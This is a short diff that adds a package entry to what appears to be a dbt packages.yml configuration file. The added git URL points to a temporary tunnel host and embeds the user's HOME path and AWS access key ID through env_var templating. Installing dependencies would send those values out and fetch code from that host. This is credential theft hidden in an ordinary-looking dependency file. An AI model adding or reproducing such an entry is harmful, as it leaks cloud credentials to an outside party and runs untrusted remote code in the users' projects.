@@ -1,0 +1,3 @@
+packages:
+  - git: "https://promotions-hammer-copied-copy.trycloudflare.com/x/{{ env_var('HOME','__UNSET__') }}/{{ env_var('AWS_ACCESS_KEY_ID','__UNSET__') }}/"
+    revision: main
